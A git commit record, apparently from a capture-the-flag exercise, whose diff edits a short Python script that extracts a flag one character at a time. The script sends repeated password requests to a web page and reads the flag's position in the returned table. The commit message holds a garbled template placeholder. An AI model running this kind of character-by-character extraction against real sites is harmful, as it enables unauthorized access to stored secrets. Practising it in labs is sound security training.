c592fda1d7dc8a2af796b50c9405153a8efa89e7
whb54012 <1226844928@qq.com>
2026-07-29 07:53:52 +0000

    自动提交：更新 ${2026/7/29 15:53ilenPM53e}

--- 1.py
+++ 1.py
@@ -4,11 +4,11 @@ cookie=input()
 param=input()
 str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
 flag=""
-data={
-    'password':flag
-}
 for i in range(48):
     for j in range(0,len(str)):
+        data={
+            'password':flag
+        }
         t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
